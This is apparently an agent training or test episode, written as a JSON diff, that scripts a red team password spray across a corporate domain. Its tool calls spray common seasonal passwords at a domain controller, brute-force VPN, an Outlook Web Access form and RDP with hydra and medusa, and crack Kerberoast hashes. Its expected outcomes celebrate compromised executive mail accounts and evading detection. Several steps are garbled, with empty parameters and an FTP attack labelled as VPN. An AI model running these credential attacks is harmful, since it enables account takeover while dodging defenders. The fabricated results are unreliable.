@@ -1,0 +1,105 @@
+{
+  "episode_id": "PENT_PASSWD_HYDRA_JOHN_EP03",
+  "title": "Red Team Password Spray Campaign",
+  "description": "Red team engagement - password spray across all services without triggering defenses",
+  "difficulty": "advanced",
+  "steps": [
+    {
+      "step_number": 1,
+      "instruction": "Enumerate user accounts via LDAP",
+      "tool": "password_spray_attack",
+      "parameters": {
+        "userlist": "/opt/enumerated_users.txt",
+        "password": "",
+        "target": "",
+        "delay": ""
+      },
+      "expected_outcome": "LDAP enum found 2,341 domain accounts - large attack surface"
+    },
+    {
+      "step_number": 2,
+      "instruction": "Test common corporate passwords",
+      "tool": "password_spray_attack",
+      "parameters": {
+        "userlist": "/opt/enumerated_users.txt",
+        "password": "Welcome2024!",
+        "target": "dc.corp.local",
+        "delay": "5"
+      },
+      "expected_outcome": "Welcome2024!: 45 accounts - common password policy bypass"
+    },
+    {
+      "step_number": 3,
+      "instruction": "Spray seasonal password",
+      "tool": "password_spray_attack",
+      "parameters": {
+        "userlist": "/opt/enumerated_users.txt",
+        "password": "Fall2024!",
+        "target": "dc.corp.local",
+        "delay": "5"
+      },
+      "expected_outcome": "Fall2024!: 28 accounts - seasonal pattern confirmed"
+    },
+    {
+      "step_number": 4,
+      "instruction": "Target VPN service",
+      "tool": "hydra_ssh_ftp_bruteforce",
+      "parameters": {
+        "service": "ftp",
+        "target": "vpn.corp.local",
+        "userlist": "valid_users.txt",
+        "passlist": "seasonal_passwords.txt"
+      },
+      "expected_outcome": "VPN access: 12 accounts compromised - remote access established"
+    },
+    {
+      "step_number": 5,
+      "instruction": "Attack Outlook Web Access",
+      "tool": "hydra_http_post_form_attack",
+      "parameters": {
+        "target_url": "https://mail.corp.local",
+        "form_params": "/owa/auth.owa:username=^USER^&password=^PASS^:F=incorrect",
+        "userlist": "executives.txt",
+        "passlist": "corporate_spray.txt"
+      },
+      "expected_outcome": "OWA compromise: 3 executive accounts - email access for social engineering"
+    },
+    {
+      "step_number": 6,
+      "instruction": "Parallel attack on multiple RDP servers",
+      "tool": "medusa_parallel_bruteforce",
+      "parameters": {
+        "service": "rdp",
+        "target": "workstations.txt",
+        "userlist": "domain_users.txt",
+        "passlist": "found_passwords.txt"
+      },
+      "expected_outcome": "RDP spray across 234 workstations: 23 compromised - lateral movement paths"
+    },
+    {
+      "step_number": 7,
+      "instruction": "Verify no account lockouts",
+      "tool": "password_spray_attack",
+      "parameters": {
+        "userlist": "",
+        "password": "",
+        "target": "",
+        "delay": "5"
+      },
+      "expected_outcome": "Zero account lockouts after 6 spray attempts - detection evasion successful"
+    },
+    {
+      "step_number": 8,
+      "instruction": "Compromise service accounts",
+      "tool": "john_the_ripper_hash_cracking",
+      "parameters": {
+        "hashfile": "/tmp/kerberoast_hashes.txt",
+        "wordlist": "/usr/share/wordlists/rockyou.txt",
+        "format": "krb5tgs"
+      },
+      "expected_outcome": "Kerberoast cracked 2 service account passwords - SQLService, BackupService compromised"
+    }
+  ],
+  "success_criteria": "Password spray compromised 111 accounts across AD, VPN, OWA, RDP without detection - red team objectives met",
+  "cleanup": "Red team report: weak password policy enabled spray attack, recommend lockout threshold, password complexity, monitoring"
+}
